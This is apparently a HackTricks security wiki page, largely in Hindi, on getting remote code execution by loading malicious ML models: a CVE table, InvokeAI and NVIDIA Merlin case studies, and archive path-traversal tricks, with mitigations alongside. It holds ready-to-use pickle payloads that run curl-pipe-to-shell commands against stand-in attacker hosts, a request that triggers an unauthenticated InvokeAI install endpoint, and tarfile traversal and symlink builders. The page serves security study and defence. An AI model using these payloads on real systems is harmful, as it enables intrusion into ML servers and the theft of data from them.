# मॉडल्स RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models सामान्यतः विभिन्न फ़ॉर्मैट्स में साझा किए जाते हैं, जैसे ONNX, TensorFlow, PyTorch, आदि. इन्हें developers की मशीनों या production सिस्टम्स में उपयोग के लिए लोड किया जा सकता है. आम तौर पर models में malicious code नहीं होना चाहिए, पर कुछ मामलों में model का उपयोग सिस्टम पर arbitrary code चलाने के लिए किया जा सकता है — या तो यह किसी intended feature के कारण होता है या model loading library में vulnerability के कारण.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *असुरक्षित deserialization* `torch.load` **(CVE-2025-32434)**                                                              | model checkpoint में malicious pickle code execution का कारण बनता है ( `weights_only` safeguard को bypass करते हुए)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download से code execution; management API में Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint `load_model_trainer_states_from_checkpoint` के दौरान pickle reducer को ट्रिगर करता है → ML worker में code execution            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML से model लोड करना `yaml.unsafe_load` का उपयोग करता है (code exec) <br> **Lambda** layer वाला model लोड करने पर arbitrary Python code चलता है          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model integer overflow ट्रिगर करता है → heap corruption (संभावित RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` के माध्यम से model लोड करने पर attacker के `__reduce__` payload के साथ pickle execute होता है                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` डिफ़ॉल्ट रूप से pickled object arrays की अनुमति देता है – malicious `.npy/.npz` code exec ट्रिगर करते हैं                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX मॉडल के external-weights path directory से बाहर निकल सकता है (arbitrary फाइलें पढ़ना) <br> Malicious ONNX model tar arbitrary files को overwrite कर सकता है (RCE तक ले जा सकता है) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Custom operator वाला मॉडल attacker के native code को लोड करने की आवश्यकता कर सकता है; जटिल मॉडल graphs लॉजिक का दुरुपयोग कर unintended computations execute कर सकते हैं   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` सक्षम करके model-load API का उपयोग relative path traversal की अनुमति देता है ताकि फाइलें लिखी जा सकें (उदा., `.bashrc` overwrite कर RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file parser में heap buffer overflows का कारण बनता है, जिससे victim सिस्टम पर arbitrary code execution संभव होता है                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model जिसमें Lambda layer है, लोड पर कोड अभी भी चलता है (Keras safe_mode पुराने फॉर्मेट को कवर नहीं करता – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | कई ML tools (उदा., pickle-based model formats, Python `pickle.load`) model files में embedded arbitrary code को execute करेंगे जब तक mitigations न हों | |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` Stable-Diffusion के लिए एक लोकप्रिय open-source web interface है. Versions **5.3.1 – 5.4.2** REST endpoint `/api/v2/models/install` expose करती हैं जो users को arbitrary URLs से models download और load करने देती है.

Internally the endpoint eventually calls:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
जब प्रदान की गई फ़ाइल एक **PyTorch checkpoint (`*.ckpt`)** हो, `torch.load` एक **pickle deserialization** करता है। क्योंकि सामग्री सीधे user-controlled URL से आती है, एक attacker checkpoint के अंदर custom `__reduce__` method वाले एक malicious object को embed कर सकता है; यह method **during deserialization** executed होता है, जिससे InvokeAI server पर **remote code execution (RCE)** हो जाता है।

इस vulnerability को **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) आवंटित किया गया था।

#### Exploitation walk-through

1. एक malicious checkpoint बनाएं:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. अपने नियंत्रण वाले HTTP सर्वर पर `payload.ckpt` होस्ट करें (उदाहरण के लिए `http://ATTACKER/payload.ckpt`).
3. vulnerable endpoint को ट्रिगर करें (कोई authentication आवश्यक नहीं):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. जब InvokeAI फ़ाइल डाउनलोड करता है तो यह `torch.load()` को कॉल करता है → `os.system` गैजेट चल जाता है और हमलावर InvokeAI प्रक्रिया के संदर्भ में कोड निष्पादन हासिल कर लेता है।

Ready-made exploit: **Metasploit** मॉड्यूल `exploit/linux/http/invokeai_rce_cve_2024_12029` पूरे फ्लो को स्वचालित करता है।

#### शर्तें

•  InvokeAI 5.3.1-5.4.2 (scan flag डिफ़ॉल्ट **false**)  
•  `/api/v2/models/install` हमलावर द्वारा पहुँच योग्य होना चाहिए  
•  प्रक्रिया के पास शेल कमांड्स निष्पादित करने की अनुमति हो

#### निवारण

* **InvokeAI ≥ 5.4.3** में अपग्रेड करें – पैच `scan=True` को डिफ़ॉल्ट के रूप में सेट करता है और deserialization से पहले malware scanning करता है।  
* जब प्रोग्रामेटिक रूप से checkpoints लोड कर रहे हों तो `torch.load(file, weights_only=True)` का उपयोग करें या नया [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper इस्तेमाल करें।  
* model sources के लिए allow-lists / signatures लागू करें और सेवा को least-privilege के साथ चलाएँ।

> ⚠️ ध्यान रखें कि **कोई भी** Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) अनविश्वसनीय स्रोतों से deserialize करने के लिए स्वाभाविक रूप से असुरक्षित है।

---

यदि आपको पुराने InvokeAI संस्करणों को रिवर्स प्रॉक्सी के पीछे चलाना आवश्यक है तो एक ad-hoc निवारण का उदाहरण:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE असुरक्षित `torch.load` के माध्यम से (CVE-2025-23298)

NVIDIA की Transformers4Rec (Merlin का हिस्सा) ने एक असुरक्षित checkpoint loader एक्सपोज़ किया जो सीधे user-provided paths पर `torch.load()` को कॉल करता था। चूंकि `torch.load` Python के `pickle` पर निर्भर करता है, एक attacker-controlled checkpoint deserialization के दौरान reducer के जरिए arbitrary code execute कर सकता है।

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

क्यों यह RCE तक ले जाता है: Python `pickle` में, एक ऑब्जेक्ट एक reducer (`__reduce__`/`__setstate__`) परिभाषित कर सकता है जो एक callable और arguments लौटाता है। वह callable unpickling के दौरान execute होता है। अगर ऐसा ऑब्जेक्ट किसी checkpoint में मौजूद है, तो यह किसी भी weights के उपयोग से पहले चल जाता है।

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
डिलीवरी वेक्टर और ब्लास्ट रेडियस:
- Trojanized checkpoints/models जो repos, buckets, या artifact registries के माध्यम से साझा किए जाते हैं
- Automated resume/deploy pipelines जो checkpoints को ऑटो-लोड कर लेते हैं
- Execution training/inference workers के अंदर होती है, अक्सर elevated privileges के साथ (जैसे, containers में root)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ने direct `torch.load()` को एक restricted, allow-listed deserializer से बदल दिया जो `transformers4rec/utils/serialization.py` में implement किया गया है। नया loader types/fields को validate करता है और लोड के दौरान arbitrary callables को invoke होने से रोकता है।

PyTorch checkpoints के लिए रक्षात्मक मार्गदर्शन:
- Untrusted डेटा को unpickle न करें। जब संभव हो तो non-executable formats जैसे [Safetensors](https://huggingface.co/docs/safetensors/index) या ONNX को प्राथमिकता दें।
- यदि आपको PyTorch serialization का उपयोग करना ही है, तो सुनिश्चित करें `weights_only=True` (नए PyTorch में supported) या Transformers4Rec patch जैसा custom allow-listed unpickler उपयोग करें।
- model provenance/signatures लागू करें और sandbox deserialization लागू करें (seccomp/AppArmor; non-root user; restricted FS और कोई network egress न हो)।
- checkpoint load के समय ML सेवाओं से उत्पन्न अनपेक्षित child processes की निगरानी करें; `torch.load()`/`pickle` के उपयोग को trace करें।

POC और कमजोर/पैच संदर्भ:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## उदाहरण – दुष्ट PyTorch model बनाना

- मॉडल बनाएं:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- मॉडल लोड करें:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent का FaceDetection-DSFD एक `resnet` endpoint एक्सपोज़ करता है जो उपयोगकर्ता-नियंत्रित डेटा को deserializes करता है। ZDI ने पुष्टि की कि एक remote attacker पीड़ित को मजबूर कर सकता है कि वह एक malicious page/file लोड करे, उसे उस endpoint पर एक crafted serialized blob push कराए, और `root` के रूप में deserialization ट्रिगर कर दे, जिससे full compromise हो सकता है।

The exploit flow mirrors typical pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) उसी तरह weaponize किया जा सकता है, चाहे transport HTTP, WebSocket हो या watched directory में गिराया गया कोई file।

## Models to Path Traversal

जैसा कि [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) में बताया गया है, विभिन्न AI frameworks द्वारा उपयोग किए जाने वाले अधिकांश model formats archives पर आधारित होते हैं, आम तौर पर `.zip`। इसलिए इन formats का दुरुपयोग करके path traversal attacks किए जा सकते हैं, जिससे उस सिस्टम से जहाँ मॉडल लोड किया जाता है arbitrary files पढ़ना संभव हो जाता है।

उदाहरण के लिए, निम्नलिखित कोड के साथ आप ऐसा model बना सकते हैं जो लोड होने पर `/tmp` directory में एक file बनाएगा:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
या, निम्नलिखित कोड के साथ आप एक मॉडल बना सकते हैं जो लोड होने पर `/tmp` डायरेक्टरी के लिए एक symlink बनाएगा:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### गहन अध्ययन: Keras .keras deserialization और gadget hunting

यदि आप .keras internals, Lambda-layer RCE, ≤ 3.8 में arbitrary import issue, और allowlist के अंदर post-fix gadget discovery पर एक लक्षित मार्गदर्शिका चाहते हैं, तो देखें:

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## संदर्भ

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
